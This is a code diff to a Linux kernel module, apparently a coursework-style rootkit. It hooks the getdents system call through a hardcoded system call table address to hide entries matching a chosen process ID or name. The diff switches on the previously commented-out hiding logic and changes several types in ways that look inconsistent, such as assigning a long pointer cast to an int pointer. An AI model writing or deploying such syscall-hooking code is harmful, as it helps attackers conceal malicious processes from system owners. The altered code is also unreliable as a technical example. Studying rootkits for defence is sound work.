@@ -41,17 +41,17 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 //We're getting its adddress from the System.map file (see above).
-static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
+static unsigned int *sys_call_table = (unsigned long*)0xffffffff81a00200;
 
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
-asmlinkage long (*original_call)(unsigned int fd, 
+asmlinkage int (*original_call)(unsigned int fd, 
 struct linux_dirent __user *dirp, unsigned int count);
 
 //Define our new sneaky version of the 'getdents' syscall
-asmlinkage long sneaky_sys_getdents(unsigned int fd, 
+asmlinkage int sneaky_sys_getdents(unsigned int fd, 
 struct linux_dirent __user *dirp, unsigned int count){
   //printk(KERN_INFO "pid = %d\n", mypid);
   long value;
@@ -65,10 +65,10 @@ struct linux_dirent __user *dirp, unsigned int count){
     //printk("%s\n", dirp->d_name);
     if( strcmp(dirp->d_name, mypid) == 0 || strcmp(dirp->d_name, processname) == 0 ) { 
       printk("%s\n", dirp->d_name);
-      
-      /*memmove(dirp, (char*) dirp + dirp->d_reclen, tlen);
+      memmove(dirp, (char*) dirp + dirp->d_reclen, tlen);
       value -= len;
-      printk(KERN_INFO "hide successful\n");*/
+      printk(KERN_INFO "hide successful\n");
+      continue;
     }
     if(tlen) {
       dirp = (struct linux_dirent* ) ((char*) dirp + dirp->d_reclen);
